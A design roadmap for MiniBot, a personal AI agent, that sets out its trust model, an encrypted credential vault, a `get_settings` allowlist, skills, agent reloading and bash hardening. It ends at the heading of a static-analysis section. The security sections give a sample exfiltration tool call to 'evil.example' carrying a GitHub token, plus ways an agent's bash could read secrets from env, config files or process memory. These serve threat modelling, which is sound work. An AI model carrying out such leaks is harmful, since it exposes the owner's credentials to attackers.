# Roadmap

Possible roadmap to follow now...

## Status at a glance

| phase | topic | status |
|---|---|---|
| 0 | bash env default | done |
| 1 | credential vault | done |
| 2 | skills for specialist agents | done |
| 3 | native skills, runtime self-knowledge, agent management | **done** — `get_settings`, `minibot-docs`, optional `reload_agents`, and optional model-authored agents with an owner ceiling |
| 3b | mid-turn user messages and `/stop` | pending, after `reload_agents` and the agent management skill |
| 4 | MCP OAuth (#65) | pending |
| 5 | guardrail enhancements | pending |
| 6 | bash tool hardening | pending, priority depends on the Trust model |
| 7 | share tool construction with task workers | done |
| 8 | generic opt-in extensions for task workers | pending, wait for a second extension that needs it |

Dropped: a native SMTP tool. Mail is covered by an MCP server (`docs/mcp_servers.rst`) behind the
`[tools.approval]` gate, so there is nothing left for MiniBot to own.

## Trust model

Security here isn't a property of the software alone — it's the combination
of which tools are enabled, where MiniBot runs, what credentials it's given,
how trusted the inputs are, and what the blast radius of a tool doing the
wrong thing actually is. A fairly permissive `bash` is a reasonable choice
inside a disposable VM/container with no valuable credentials and a personal
Telegram account; the same tool is a very different risk next to `~/.ssh`,
cloud credentials, or LAN access.

MiniBot's job is not to make it impossible for the agent to do damage — that
would mean rebuilding a sandbox platform inside the agent, a race it can't
win against dedicated isolation tooling. The goal is **safe defaults,
explicit escape hatches, a documented trust model** — not an implicit
guarantee the software can't actually make.

- **MiniBot's own responsibility**: safe-by-default config
  (`bash.pass_parent_env = false`), secrets never reaching the LLM (Phase 1),
  guardrails on consequential actions (the `[tools.approval]` gate, Phase 5). These
  matter *regardless of deployment*, because the LLM provider itself — the
  remote API — sees whatever ends up in tool-call arguments and context, no
  matter how isolated the host is. No amount of sandboxing the process
  protects against that; only not putting the secret there in the first
  place does. This is why the vault stays high priority even for an owner
  who already runs MiniBot in a throwaway VM.
- **Deployment's responsibility**: OS/filesystem/process isolation for
  `bash`/`python_exec` (Phase 6's jail/container options). An owner who
  already isolates the host can reasonably set `sandbox_mode = "none"` and
  accept the ambient risk — that's a valid choice, not a bug to prevent.

Worth stating this plainly in the README/docs, roughly:

> MiniBot can execute powerful tools such as shell commands and Python code.
> It is not intended to be a security boundary by itself. For untrusted
> workloads or deployments with sensitive host data, run MiniBot inside an
> appropriately isolated environment.

## [x] Phase 0 — fix bash's env default now (no dependency on anything else)

`BashToolConfig.pass_parent_env` defaults to `True`
(`minibot/adapters/config/schema.py:572`), so `bash` inherits the daemon's
entire process environment today, vault or no vault — any `${ENV_VAR}`
secret already used for config (`GITHUB_TOKEN`, static MCP header tokens, DB
URLs) is retrievable right now via `bash` → `env`. Flip the default to
`False` with an explicit `env_allowlist`, matching `python_exec`'s existing
default (`schema.py:560-561`) — `bash` is the outlier, not the norm. Small,
immediate, and a prerequisite for Phase 1's `MINIBOT_VAULT_PASSWORD` unlock
option to be trustworthy at all.

## [x] Phase 1 — Credential vault (reference-only)

Single owner, no per-owner scoping — MiniBot is a personal assistant for one
person, not multi-tenant. `owner_id` shows up throughout `ToolContext` today
as a legacy hook but is expected to go away; don't design new storage around
it.

Foundation for everything below. LLM never sees secret values, only reference
tokens (`secret://name`); real values are resolved outside the LLM loop, right
before the outbound call.

A plain SQLite row (even encrypted) doesn't hold up on its own: `bash` and
`python_exec` run as the same OS user as the daemon, so anything readable by
that user is readable by the LLM's own tools. The boundary that actually
matters is: the encryption key must never touch disk or a subprocess env, only
live in the trusted adapter's memory.

Ansible-vault-style design, shipped as an optional extension (not core):

- Single encrypted file (`secrets.vault.yml` by default), AES-256-GCM via
  `cryptography` (new poetry extra `vault = ["cryptography"]` — stdlib has no
  AES; don't hand-roll a cipher).
- Key derived from a password via scrypt/PBKDF2 + a stored salt. Supplied
  once at daemon startup. **Interactive prompt is the recommended, safe-by-
  default method for v1** — no password or key material ever touches disk.
  `--vault-password-file` and `MINIBOT_VAULT_PASSWORD` are supported but not
  on equal footing — ship with an explicit warning: Phase 0 only fixes env
  inheritance, it says nothing about `--vault-password-file`, which stays
  exposed to `bash` reading it directly off disk (no cwd jail at all — see
  Phase 6) regardless of Phase 0. Both alternate methods stay a real risk
  until Phase 6's filesystem isolation lands, not just the env-var one.
  Whichever method is used, that password/file becomes the thing to protect
  instead.
- CLI helper `minibot vault edit <path>` — like `ansible-vault edit`:
  decrypt to a 0600 temp file, launch `$EDITOR`, re-encrypt on exit, shred the
  temp file. This is how the owner writes secrets; the LLM never gets a
  write path either.
- LLM-facing tool surface: `list_secrets()` (names only). No `get_secret`
  tool at all.
- **Secrets are destination-bound, not LLM-referenceable.** A `secret://name`
  string must never be something the LLM writes into a tool argument that a
  generic executor then substitutes — that would turn the vault into a
  decryption oracle any tool call could invoke, e.g.
  `http_request(url="https://evil.example", headers={"Authorization":
  "secret://github"})` exfiltrates the token to an attacker-chosen
  destination without the LLM ever seeing the value. Instead, an admin binds
  a secret to a specific destination in config: `MCPClient` resolves its own
  server's stored token internally (server/issuer come from config, not LLM
  input). `http_client` gets **no generic vault access** in v1 — either no
  vault-backed auth at all for that tool, or, if a real need shows up later,
  a `[tools.http_client.credentials]` domain-allowlist that the adapter
  checks against the *actual request host*, attaching the header itself
  when it matches. The LLM never writes or sees a secret reference either
  way.
- **Deferred to Phase 4**, where this is restated concretely:
  `execute_tool_calls_for_runtime` (`minibot/llm/services/tool_executor.py`)
  is the choke point for the *other* side of this — redacting any known
  secret value out of a `ToolResult` (and logs) before it reaches the LLM.
  Not shipped in Phase 1: the same exfil-via-echo risk already exists
  un-redacted today for `${ENV_VAR}` static MCP headers, so Phase 1 does not
  widen it, and threading a redactor through `LLMClientFactory` →
  `LLMClient` → the executor before Phase 4 knows its shape is premature.
  The "reject a call whose target isn't the bound destination" half is moot
  under the destination-bound model — nothing resolves at the executor, so
  there is no call to reject. It is a literal containment/redaction check
  against known vault values, not semantic classification, so it's allowed
  under the project's output-classification rule either way.

Shipped differently from the sketch above, deliberately:

- Lives in `minibot/adapters/vault/` with a `[vault]` config section, not an
  out-of-tree extension — MCP header binding is core code an extension can't
  reach. "Optional" is the `vault` poetry extra plus `enabled = false`, the
  same shape `rag`/`stt` use. Only the `list_secrets` tool is an extension
  (`minibot/extensions/tools/vault.py`).
- No PyYAML. The plaintext is a flat `name: value` document parsed by
  `adapters/vault/secrets_yaml.py` (~50 lines, string-only — never coerces a
  numeric API key to `int`, which is why `shared/frontmatter.py` could not be
  reused). Values needing whitespace/newlines are JSON-quoted; no block
  scalars.
- The envelope is `{version, kdf, n, r, p, salt, nonce, ciphertext}` JSON;
  scrypt comes from stdlib `hashlib`, only `AESGCM` from `cryptography`.
- `--vault-password-file` is `[vault] password_file` for the daemon (the
  daemon path parses no args, and the field is already `${ENV}`-expandable).
  The `--password-file` flag exists on `minibot vault`, where scripting
  needs it.

~~Out of scope for this vault: today's `${ENV_VAR}` config-time secrets
(`token_env`, static MCP headers). Different threat model — admin-authored,
live only in `config.toml`, never handled through tool arguments.~~

**Corrected after Phase 1 shipped.** It is *not* a different threat model:
`bash` has no filesystem jail, so `cat config.toml` reaches every plaintext
credential in it. A `${secret:NAME}` reference form was therefore added,
resolvable in any config string from the vault (`adapters/config/environment.py`),
so the file on disk holds only references. `${ENV_VAR}` still works and the
two coexist; no migration is forced. The remaining exposure is unchanged for
both: a resolved value lives in the daemon's memory.

Ceiling: this protects secrets at rest and from the LLM's own tool calls. It
does not protect against a fully compromised daemon process reading its own
memory (e.g. `/proc/<pid>/mem`) — same trust boundary as any self-hosted
secret manager running as one OS user. Out of scope unless that threat model
changes.

## [x] Phase 2 — Skills for specialist agents (regression from 0.20) — PRIORITY

Specialists cannot load skills today, whatever their `tools_allow` says. Before 0.20,
`invoke_agent` ran a specialist inside the daemon against the main agent's tool list, which
includes `list_skills` and `activate_skill` (`app/tool_factory.py:56-59`). Since #93 every
delegation goes through `spawn_task`, and the worker subprocess builds its own tools in
`_build_worker_tools` (`app/tasks/worker.py:227`): time, calculator, HTTP, Python, bash,
files, grep, MCP and extension tools — **no skill tools**. `filter_tools_for_agent` has nothing to
let through, so an agent listing `activate_skill` silently runs without it. The skill catalog
(`preload_catalog`) is only composed into the main agent's prompt (`app/dispatcher.py:110`), so a
specialist does not even learn which skills exist.

This is also why `docs/agents.rst` is wrong right now ("a specialist can be pointed at one the same
way the main agent is"), and why adding `list_skills` / `activate_skill` to an agent such as
`agents/browser_agent.md` has no effect.

- In `_build_worker_tools`, when `[tools.skills] enabled`, build a `SkillRegistry` the way
  `AppContainer` does (`adapters/container/app_container.py:62`) and add `SkillLoaderTool`.
  Still scoped by `tools_allow` / `tools_deny` like every other tool, so a specialist only gets
  skills if its definition asks for them.
- **Not** `install_skill`: installing pulls remote instructions into the agent's instruction set
  and needs the owner's confirmation, which a background worker has no channel for. It stays on
  the main agent.
- Deferred, documented in `docs/agents.rst` instead: append the skill catalog to a specialist's
  prompt when it ends up with `activate_skill`; without it the specialist has to call `list_skills`
  first or already know the skill's name from its own prompt.
- Test in `tests/test_task_worker.py`: a spec with `tools_allow: [activate_skill]` receives it; one
  without does not.

Ahead of everything below because it is a regression in shipped behaviour, not new capability,
and the fix is small.

## [x] Phase 3 — Native skills & runtime self-knowledge

**Done** — version single-sourcing (#82), the native tier + `create-skill` (#83),
`install-skill` + `install_skill` (#84, released in 0.18.0), `get_settings`, the
`minibot-docs` skill, and then the runtime agent-management work below.

Shipped differently from the sketch in this section, after a security review of the original
`reload_agents` + `create-agent` plan:

- **Separable activation.** `[orchestration.specialists].enabled` is the switch for *using*
specialists; `[orchestration.agent_management]` `reload` and `write` are separate switches for
*managing* them, both off by default. The four modes (none, owner-only, reload-only, managed) are
reachable by config alone. See :doc:`agents`.
- **A managed-agent ceiling, not a blanket tool cap.** The earlier sketch proposed capping every
specialist at the main agent's visible tools. That is wrong: `exclusive`/`exclusive_mcp` ownership
deliberately lets a specialist own a tool the main agent is denied, and the main agent's
`tools_deny` is not a system-wide prohibition. The real problem was that a *model-authored*
definition could grant itself anything globally enabled, so model-authored definitions are bounded
by an owner ceiling and owner-authored ones are left alone. Provenance is the directory the loader
read, never a frontmatter field.
- **Enforcement is not tool-hiding.** The ceiling is applied at load, on reload, before a write and
in the worker after model overrides, so writing a file by hand and reloading cannot bypass it.
- **Writes go through a service, not the filesystem tools.** `AgentManagementService` validates the
name, the definition and the ceiling, then persists atomically through a confined store; the tools
only call it.

Deferred, with the reasoning above as the reason: a specialist may still be authored by the owner
only unless `write = true`, and the ceiling defaults to granting nothing.

Still out of scope for Phase 3: the `create-agent` skill is bundled but hidden until `write = true`,
and the agent-management tools stay unavailable to workers and specialists.

Known limit: the ceiling only bounds what a managed agent may *ask for*. A specialist runs in a task
worker, which builds a narrower tool set, so listing a tool the worker never registers (for example
`rag_*`, which only the daemon registers) passes the ceiling and then yields an agent with no tools.
Tracked in Phase 8.

Different theme from the phases around it — capability, not containment —
but it lands two new LLM-facing surfaces, so the Trust model above still
applies (see the end of this section).

A fresh install ships **zero** skills, so `[tools.skills]` looks empty until
the owner hand-authors one, and the agent has no in-band way to learn where
it may write a new skill: `activate_skill` returns the `skill_dir` of an
existing skill and nothing else.

Ship a small set of skills inside the package (`minibot/skills/`) on a third
discovery tier, ranked below project- and user-level so a hand-written skill
of the same name always wins. It must be independent of `[tools.skills]
paths`, which *replaces* the default discovery list today
(`app/skill_definitions_loader.py:31`) and would otherwise delete the bundled
skills silently. Gated by the existing `[tools.skills] enabled`, plus a
`native` master switch and a `native_disabled` opt-out list, so the default
needs no config and turning one off is one line.

v1 set, chosen for self-improvement and self-knowledge (`create-skill` and
`install-skill` and `minibot-docs` shipped; `create-agent` remains):

- `create-skill` — authoring, including the places MiniBot's parser is
  stricter than the agentskills.io spec (flat `key: value` frontmatter, not
  real YAML; an empty body is a silent drop).
- `install-skill` — fetch from GitHub and generic archives through the
  native `install_skill` tool (a Python `npx skills add`; works without
  bash). No node, no new Poetry dependency. Maintains a `skills-lock.json`
  in the shape the npm `skills` tool already writes. Off by default
  (`[tools.skills] install`).
- `minibot-docs` — self-knowledge: the agent *is* MiniBot, and users ask it
  how MiniBot works; without this it invents config keys that do not exist.
  Pure markdown, so the risk is in the wording, not the code. Depends on
  `get_settings`. Fetch targets, in order:
  1. `https://sonic182.github.io/minibot/llms.txt` — 2.7 KB curated page
     index, cheap enough to fetch on every lookup.
  2. `https://sonic182.github.io/minibot/_sources/<page>.rst.txt` — Sphinx
     publishes the RST sources (`html_copy_source` is on by default); clean
     RST beats scraping rendered HTML with `http_request`.
  3. `https://sonic182.github.io/minibot/llms-full.txt` — still only 6.7 KB,
     an expanded index rather than full content, so a fallback.

  Two different questions hide under "ask about minibot", and routing them
  correctly is what makes the skill right rather than merely useful:

  | question | answer from |
  |---|---|
  | "How do I enable the vault?" | docs |
  | "Am I running the vault?" | `get_settings` — never the docs |

  The published docs describe the latest release, not this process. The skill
  must say so and refuse to answer a configuration-*state* question from
  documentation. Done when a docs question is answered from
  `_sources/*.rst.txt` and a "do I have X enabled" question routes to
  `get_settings`.
- `create-agent` — specialist authoring (`agents/<name>.md`), covering create,
  edit and delete: an edit rewrites the file and a delete removes it, and
  `reload_agents` reports the result in `added` / `removed`. The tool-scoping
  rules are counterintuitive and documented nowhere the agent can see, so an
  agent writing a specialist without them produces one that looks correct and
  is broken:
  - with **neither** `tools_allow` nor `tools_deny` set, a specialist gets
    **zero** non-MCP tools (`app/agent_policies.py:48`) — not "all tools"
  - `tools_allow` is **never consulted** for an MCP tool name; MCP tools are
    gated by `mcp_servers` membership plus deny patterns only
  - `tools_allow` and `tools_deny` are mutually exclusive (enforced in
    `tool_policy_utils.py` and by a pydantic validator in `schema.py`)
  - always stripped from a delegated agent (`agent_policies.py:15`):
    `fetch_agent_info`, `spawn_task`, `list_tasks`, `get_task`, `cancel_task`
  - an empty Markdown body is **fatal**, not a warning (unlike skills, where
    it is a silent drop)

  Body flow: read `agents.directory` from `get_settings`, write
  `<directory>/<name>.md`, call `reload_agents`; an `ok: false` result names
  the file and the problem, so fix and reload until it comes back `ok: true`
  with the new name in `added`. Ships last, narrowest audience: it needs
  `reload_agents` (and `get_settings`) to be useful. Done when a specialist
  written by following the skill is delegatable in the same session.

Three supporting changes, each small, in delivery order:

- **`reload_agents` tool** — lands first. Skills re-read on an mtime/size
  fingerprint (`app/skill_registry.py:55`); `AgentRegistry`
  (`app/agent_registry.py:6`) has no equivalent. Specs are loaded once in
  `AppContainer.configure()` (`adapters/container/app_container.py:53`) and
  swapped once more by token auto-config (`app_container.py:224`, via
  `replace_all()`); nothing re-reads `agents/*.md` afterwards, so a freshly
  written specialist is invisible until restart. Useful on its own too: an
  owner who hand-edits `agents/*.md` no longer has to restart the daemon.

  Chosen shape: an explicit tool, not a fingerprint hot reload. It re-runs
  `load_agent_specs(settings.orchestration.directory)`
  (`app/agent_definitions_loader.py:18`) and swaps the result in with
  `replace_all()`. Why a tool:
  - **Errors reach the agent.** The loader *raises* on a bad file (invalid
    frontmatter, empty body), and a silent background reload would have to
    swallow that. A tool returns it, so the agent that just wrote the file
    sees what is wrong and fixes it in the same turn.
  - **The old roster survives a failure.** Swap only on success.
  - **Deterministic.** The roster changes when asked, and nothing stats the
    directory on every `get()`.

  ```json
  {"ok": true, "names": ["browser_agent", "researcher"], "added": ["researcher"], "removed": []}
  {"ok": false, "error": "agents/researcher.md: agent body prompt cannot be empty"}
  ```

  `replace_all()` keeps the registry's identity, so `AgentDelegateTool` and
  `PromptService` — both hold the registry, not a snapshot — pick the change up
  with no further wiring. Three things to get right:
  - **`fetch_agent_info` must exist even when the roster started empty.**
    `build_enabled_tools` only builds it when `not agent_registry.is_empty()`
    (`app/tool_factory.py:67`), so a first specialist reloaded into an empty
    roster could not be inspected. Drop the gate (the tool already handles an
    unknown name) or build it whenever `reload_agents` is built. `spawn_task`
    is unaffected: it comes from the tasks extension, gated on
    `[tasks].enabled`.
  - **Token auto-config.** Startup runs `apply_runtime_token_autoconfig_async`
    (`app/token_limits_autoconfig.py:20`) over the specs before the swap, and
    it fetches the models.dev catalog. Reloaded specs need the same treatment
    or a reloaded agent runs with unadjusted limits — decide whether to re-run
    it (a network call per reload) or cache the catalog.
  - **Not for specialists.** Add `reload_agents` to
    `RESERVED_DELEGATION_TOOL_NAMES` (`app/agent_policies.py:10`); a delegated
    agent must not rewrite the roster it was picked from. Task workers build
    their own registry per run (`app/tasks/worker.py`), so they see new
    files anyway — no worker wiring.

  Accepted consequence: the roster is part of the system prompt
  (`PromptService._specialist_roster_fragment`), so a reload that changes it
  changes the prompt fingerprint and drops the cached `previous_response_id`
  (`session_state_service.py:54-66`) for that session. Rare and harmless.

  Files: `minibot/llm/tools/agent_reload.py` (`.bindings()`),
  `minibot/llm/tools/reload_agents.txt` (description sidecar — an empty or
  missing file aborts startup), one branch in `app/tool_factory.py`, the reserved-name
  addition. Tests: write a new `agents/*.md` after startup, call
  `reload_agents`, assert it is delegatable; a broken file returns
  `ok: false` and leaves the previous roster in place. Docs:
  `docs/agents.rst` (currently implies a restart) and `docs/tools.rst`. Done
  when a specialist written at runtime is delegatable in the same session after
  one `reload_agents` call, including from a zero-agent start, and its roster
  line appears in the next system prompt.
- **`get_settings`** — **done** (`llm/tools/settings_info.py`, built in
  `app/tool_factory.py` and for task workers in `app/tasks/worker.py`). It
  emits `vault: {"enabled": ...}` only: whether the vault is *unlocked* is held
  outside `Settings`, so the `unlocked` field below was dropped. A read-only
  always-on core tool answering "what am I
  actually running?", sibling to `chat_history_info`
  (`llm/tools/chat_memory.py:26`, built unconditionally in
  `build_enabled_tools`). Independent of any skill; it benefits every turn where
  the agent would otherwise invent its own configuration, and it is the
  prerequisite that makes `minibot-docs` honest. Emits only sections that are
  enabled, so absence is itself the answer. Full allowlist and wiring in
  "`get_settings` design" below.
- ~~**Single-source the version**~~ — **done, merged in #82.** `__version__`
  was hardcoded at `0.1.0`, fifteen minor versions behind `pyproject.toml`,
  and referenced nowhere else, which is how the drift survived. It now reads
  installed distribution metadata; version and the resolved config path are
  in `build_environment_prompt_fragment`, and `minibot --version` exists.
  `AppContainer.get_config_path()` came with it, which `get_settings` should
  reuse.

Trust model, for the two new surfaces:

- `get_settings` reads `Settings`, which holds `bot_token`, `api_key`,
  `auth_secret`, `basic_auth_password` and credential-bearing URLs. It must
  use an explicit **field allowlist**, never a denylist — a denylist leaks
  whatever secret field is added to `schema.py` next. `is_sensitive_argument_key`
  (`llm/services/tool_executor.py:138`) exists but is a key-substring
  denylist built for log sanitizing; wrong shape for a surface the model
  reads. The test that matters is a sentinel-leak test, not a field list
  review.
- `install-skill` installs instructions the agent will later follow, which is
  a prompt-injection surface by construction. Never auto-activate after
  import; show the parsed name, description and resolved source URL; require
  explicit owner confirmation for a source the owner did not name.

### `get_settings` design

Files: `minibot/llm/tools/settings_info.py` (`.bindings()`),
`minibot/llm/tools/get_settings.txt` (description sidecar — an empty or missing
file aborts startup), one branch in `app/tool_factory.py`. The name is free of the alias
table (`http_client`, `calculator`, `datetime_now`, `artifact_insert` —
`llm/services/tool_executor.py:29`), which is what uniqueness is keyed on.

Shape: enabled-only. A section appears *only* when that feature is on, so
absence is itself the answer and the payload stays small — no
`"enabled": false` noise.

```json
{
  "ok": true,
  "version": "0.24.0",
  "config_path": "/abs/path/config.toml",
  "cwd": "/abs/path",
  "channels": ["telegram"],
  "llm": {"provider": "openrouter", "model": "..."},
  "memory": {"max_history_messages": 100, "max_history_tokens": null},
  "tools": {
    "file_storage": {"root_dir": "...", "mode": "confined", "max_write_bytes": 64000},
    "skills": {"paths": ["..."], "write_dir": "...", "write_dir_access": "filesystem",
               "native": true, "count": 4},
    "bash": {"default_timeout_seconds": 15, "max_timeout_seconds": 120},
    "mcp": {"servers": ["github"]}
  },
  "agents": {"directory": "./agents", "names": ["browser_agent", "..."]},
  "tasks": {"backend": "sqlite"},
  "scheduler": {},
  "vault": {"unlocked": true}
}
```

**Allowlist, never a denylist**, and it starts small: each section names the
exact fields it emits, and anything not named is not emitted. `Settings` is full
of secrets a denylist would leak the next time one is added to `schema.py`:
`channels.telegram.bot_token`, `llm.api_key`, `providers.<name>.api_key` /
`auth_path`, `tools.mcp.servers[].auth_secret`, `http.basic_auth_password` /
`auth_token`, plus the RabbitMQ and Qdrant URLs, which carry credentials inline.
`is_sensitive_argument_key` (`llm/services/tool_executor.py`) is a key-substring
denylist built for *log* sanitizing — cite it, do not reuse it. `${ENV}` and
`${secret:}` are resolved before validation, so by the time the tool sees
`Settings` there is no reference left to show, which is one more reason to pick
fields one by one.

v1 allowlist (the whole of it):

| emitted | source | why the agent needs it |
|---|---|---|
| `version`, `config_path`, `cwd` | `minibot.__version__`, `AppContainer.get_config_path()`, `Path.cwd()` | "what am I running / where from" — use the getter, do not call `resolve_config_path()` again |
| `channels` | **names only** of enabled channels | which surface it is talking on |
| `llm.provider`, `llm.model`, `llm.prompts_dir` | `LLMMConfig` | self-description, cost/capability questions, where prompt packs live |
| `memory.backend`, `max_history_messages`, `max_history_tokens` | `MemoryConfig` | history/compaction questions |
| `agents.directory`, `agents.names` | `OrchestrationConfig.directory`, `AgentRegistry.names()` | required by `create-agent` |
| `tools.<name>` present-or-absent | `ToolsConfig` | which capabilities exist this turn |
| `tools.file_storage.root_dir`, `.mode`, `.max_write_bytes` | `FileStorageToolConfig` | already in the prompt fragment; here in structured form |
| `tools.skills.paths`, `.write_dir`, `.write_dir_access`, `.native`, `.count` | `SkillRegistry` | same source `list_skills` reads, so one value |
| `tools.bash.default_timeout_seconds`, `.max_timeout_seconds`, `.env_allowlist` | `BashToolConfig` | timeouts it would otherwise guess; env var **names** (not values) |
| `tools.mcp.servers` | **names only** | which remote toolsets exist |
| `tasks.backend` | `TasksConfig.backend` | async delegation questions |
| `scheduler` | presence only | whether scheduling is available |
| `vault.unlocked` | bool | whether `${secret:}` resolution is live |

Never emitted, in any form: `llm.api_key`, `llm.base_url`, `llm.extra_headers`,
`llm.auth_path`, every `providers.<name>.*`, `channels.telegram.*` beyond the
name, `tools.mcp.servers[].url` / `.auth_secret`, all of `[http]`, all of
`[rabbitmq]`, `vault.path` / `vault.password_file` / entry names / entry values,
`memory.sqlite_url` and every other `*_url`, and `runtime.owner_id`.
`extra_headers` and `base_url` read as harmless and are not: the first is where
people put `Authorization`, the second can be an internal endpoint.

Rule for growing the list: an addition qualifies when it names **one** exact
field, is non-secret *by construction* rather than by inspection of today's
value, answers a question one of the shipped skills actually asks, and the
sentinel leak test still passes.

Division of labour with the system prompt: `build_environment_prompt_fragment`
(`app/environment_context.py`) stays the place for the few facts worth paying
for on every turn (cwd, managed root, confined/yolo mode, version, config path).
The broad enabled-map costs nothing until asked, so it lives behind this tool.

Wiring:
- **Workers.** A tool wired only into `app/tool_factory.py` does not exist for task
  workers. Add it to `_build_worker_tools` and `_WORKER_TOOL_ALLOWLIST`
  (`app/tasks/worker.py`). Probably yes — workers ask the same questions.
- **Specialists.** A specialist with neither `tools_allow` nor `tools_deny` gets
  zero non-MCP tools, so `get_settings` must be listed explicitly in any agent
  that needs it.

Tests — the one that matters: build a `Settings` with every secret-bearing field
set to a unique sentinel, call the tool, and assert the sentinel appears nowhere
in the serialized result. That is the test that keeps catching leaks as
`schema.py` grows. Plus: a disabled section is absent from the payload entirely.
Docs: `docs/tools.rst`. Done when `get_settings` on a minimal config returns only
the sections that are on, and the sentinel test passes with every secret field
populated.

Open question: do bundled native skills need to be visible to task workers?
Workers build their own `SkillRegistry` in `_build_worker_tools`; confirm the
native tier is included there before relying on it in `create-agent`.

## [ ] Phase 3b — Mid-turn user messages (steering) and `/stop`

Lands after Phase 3 (`reload_agents` and the agent management skill). Today a message sent while the
agent is working either waits for the turn to end or starts a competing turn. On Telegram the owner
wants to say "also consider this", "use the other account" or "stop, I solved it" while the agent is
still researching or running tools.

Shape, KISS: **one pending-message inbox per conversation**, consulted by the runtime before each
model call. No second agent, no classifier, no cancel-and-rebuild of the turn.

1. The user writes while the agent is working.
2. The message is stored in history and marked pending.
3. The current tool call finishes.
4. The runtime appends the pending messages as user messages before continuing, so the model sees
   the tool result and the correction together and decides how to proceed.

| action | behaviour |
|---|---|
| "Also add Barcelona" | folded in at the next continuation point |
| "Better search only Madrid" | the agent reorients after the current tool |
| `/stop` | explicit cancellation, handled without waiting for another model response |

Injecting a message between tools steers; it does **not** guarantee an immediate stop. A tool call
that takes two minutes delays the correction until it returns. So `/stop` stays an independent path
that cancels execution where possible. An external action that already happened (a sent email)
cannot be undone by cancelling.

Details to get right from the start:

- **One consumer per conversation.** The new message enters the active turn: no parallel second turn,
  no duplicate in history.
- **Check pending before closing the turn too.** A correction that arrives while the final answer is
  being generated must be processed before the work is declared done.
- **Several tool calls in one model response.** Check pending between executions; if there is a
  correction, hand control back to the model before running the remaining calls. Calls skipped this
  way must still be recorded correctly (call + result pairing) per each provider's protocol.

Scope of v1: main agent and `/stop` only. Steering a specific worker or specialist is deferred: with
several active tasks, "change this" needs an unambiguous addressee.

Trust model: pending messages are owner input like any other, no new surface. `/stop` must remain
owner-only.

## [ ] Phase 4 — MCP OAuth (issue #65)

Scope: alternative 1 only (auth-code + PKCE + manual callback paste). No HTTP
callback endpoint, no device flow.

Target the MCP authorization spec `2026-07-28` (confirmed via
`blog.modelcontextprotocol.io/posts/2026-07-28/`), not a generic OAuth
implementation that happens to work against two test servers:

- Validate the `iss` parameter (RFC 9207) before redeeming an authorization
  code — closes the authorization-server mix-up hole the spec calls out.
- Credentials are bound to the issuing authorization server and must not be
  reused across issuers — this is a hard constraint from the spec, not just
  good hygiene, so token storage should key by issuer, not just server name.
- Dynamic Client Registration is deprecated in favor of Client ID Metadata
  Documents (CIMD) but still functional for backward compatibility — prefer
  CIMD where a server advertises support, fall back to DCR otherwise.

- `MCPClient` (`minibot/adapters/mcp/client.py`) catches `401` on HTTP
  transport, runs MCP OAuth discovery, holds PKCE state.
- Resulting tokens stored in the Phase 1 vault, keyed by
  `(server_name, issuer)` — issuer is the binding that actually matters per
  the spec constraint above; `server_name` is bookkeeping on top of it.
- `_build_http_headers` resolves the vault reference into the `Authorization`
  header at request time.
- Owner-only admin surface (not an LLM tool) to present the auth URL and
  accept the pasted callback, via Telegram authorization.

- Output-side redaction is the one place this matters most: nothing stops a
  resolved secret coming *back* in a tool result (an API that echoes the
  `Authorization` header in an error message, an SMTP server's debug reply)
  and landing in `ToolResult.content` — which flows into LLM context, then
  conversation memory (SQLite), then compaction summaries, permanently. This
  is the redaction check from Phase 1's tool-executor bullet, applied here
  concretely.
- MCP token refresh has no lock. `MCPClient` is per-server with no mutex
  around refresh — two tool calls near token expiry could both refresh
  concurrently; some providers invalidate the old refresh token when issuing
  a new one, so the loser of that race gets locked out. Needs a lock keyed by
  `(server_name, issuer)`.
- Vault file needs `.gitignore` treatment, same as `data/kv_memory.db` — keep
  it out of git and out of the docker build context by default.
- No rotation/recovery, no hot-reload, stated as explicit non-goals for v1
  (same limits ansible-vault has): forgotten password means starting over;
  editing the vault file while the daemon is running requires a restart to
  pick up the change.

## [ ] Phase 5 — Guardrail enhancements

Not a duplicate of Phase 1. Under the destination-bound model, the LLM never
has a `secret://` reference to put in an argument at all, so there's nothing
in Phase 1 checking argument *content* for known vault values — its
redaction check only runs on tool *results*. This phase covers the input
side: a secret that entered the conversation another way entirely (the user
pastes a raw API key into chat instead of storing it, or the LLM produces
something secret-shaped) and could otherwise get echoed into a later tool
call's arguments:

- `ToolGuardrailValidator` gains a check for secret-*shaped* values in
  arguments — entropy/prefix heuristics (`sk-`, `ghp_`, long high-entropy
  tokens), independent of whether the value matches a known vault entry.
- `GuardrailDecision` gains a `credential_exposure` field (structured, not
  regex/text classification, per project convention).

## [ ] Phase 6 — bash tool hardening (mixed priority — see Trust model)

Two different things live in this phase, deliberately split by who owns
them:

- **The AST pre-filter below**: MiniBot's job, worth doing on a similar
  timeline to the other security phases. It's cheap, deterministic, and
  catches accidental destructive commands too, not just adversarial ones —
  useful even inside a fully-isolated deployment.
- **The OS-level containment options at the end (1-3)**: per the Trust
  model above, this is the deployment's job, not something MiniBot's
  roadmap should try to fully solve by building a sandbox platform into the
  agent. Kept here as documented options for an owner who wants MiniBot
  itself to add a layer, not as a committed deliverable.

Everything below assumes secrets are safe from `bash` as long as they never
appear as plaintext arguments or in a file it can read. That assumption
doesn't hold today:

- ~~`BashToolConfig.pass_parent_env` defaults to `True`, so the LLM's `bash`
  tool inherits the daemon's *entire* process environment~~ — fixed in Phase 0;
  the default is now `False` with an `env_allowlist`. An owner who sets
  `pass_parent_env = true` back (as `config.yolo.toml` does) still exposes every
  `${ENV_VAR}` config secret to `bash` → `env`.
- `bash`'s `cwd` (`_coerce_cwd`, `bash.py:176-185`) accepts any existing
  directory on the filesystem — there's no root jail at all, unlike
  `LocalFileStorage` (`adapters/files/local_storage.py:339-348`), which
  refuses to resolve a path outside its managed root by default.
- `python_exec` already has a `sandbox_mode` field (none/basic/rlimit/cgroup/
  jail) and a working `jail` implementation that just prepends a configurable
  `command_prefix` (e.g. `bwrap`, `firejail`, `nsjail`) to the command
  (`python_exec.py:679-684`, `PythonExecJailConfig.command_prefix`). `bash`
  has none of this — no `sandbox_mode`, no rlimits, no jail wrapper.

Prior art check: some coding-agent tools embed a Rust shell interpreter
(a bash-compatible engine) plus Rust reimplementations of common utilities
for their bash tool. Worth naming clearly: **that buys performance and
cross-platform parity, not containment.** Their own docs say so directly —
"Pattern approval is not containment. Once approved, a process keeps the
shell's ambient filesystem, network, and subprocess access." Their actual
safety layer is policy (curated non-interactive env defaults, allow/deny
command patterns, an interceptor that reroutes risky raw commands to
dedicated tools) on top of an unsandboxed subprocess — same ceiling `bash`
already has here. Not a shortcut past this phase's real question.

### Pre-execution static analysis (a filter, not a replacement for sandboxing)

